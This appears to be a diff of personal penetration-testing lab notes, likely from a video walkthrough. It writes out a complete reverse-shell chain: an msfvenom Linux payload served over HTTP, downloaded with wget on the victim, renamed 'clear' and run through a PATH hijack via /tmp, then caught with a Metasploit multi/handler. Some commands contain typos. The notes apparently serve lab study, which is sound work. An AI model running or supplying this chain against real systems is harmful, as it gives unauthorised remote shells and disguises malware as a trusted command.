@@ -98,9 +98,40 @@ up on a webpage and the downloading it from victim.
 [3:36]
 
 (ATTACKER) msfvenom-p linux/x64/shell/reverse_tcp LHOST=192.168.122.209 LPORT=61775 -f elf -o mal
-open mfsconsole
-search multi handler
+(ATTACKER) sudo rm -r__MACosx
+(ATTACKER) sudo rm -r 48*
+(ATTACKER) ls 
+(ATTACKER) file mal
 
+(VICTIM) cd /tmp
+(VICTIM) wget http://192.168.122.209:8000/mal
+(VICTIM) ls
+(VICTIM) ls -al
+(VICTIM) mv mal clear (malicious binary is known as clear)
+(VICTIM) ls
+(VICTIM) echo $PATH
+(VICTIM) export PATH+/tmp:$PATH
+(VICTIM) echo $PATH
+(VICTIM) chmod u+x clear
+(VICTIM) ls -al | grep clear
+(VICTIM) ./clear
+
+open mfsconsole 
+(ATK)(msf6) search multi handler
+(ATK)(msf6) use 5 or exploit/multi/handler
+(ATK)(msf6) set lhost 192.168.122.209
+(ATK)(msf6) set lport 61775
+(ATK)(msf6) show payload
+(ATK)(msf6) set payload linux/x64/shell/reverse_tcp
+(ATK)(msf6) show options to see if payload is set properly
+(ATK)(msf6) run
+
+(VICTIM) ./clear
+(ATK)(msf6) go back and check if command shell opened
+then run...
+(ATK)(msf6) id
+(ATK)(msf6) ls -la | grep clear
+(ATK)(msf6) arper
 
 [[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
 this will be for the report that enumeration was a dead end
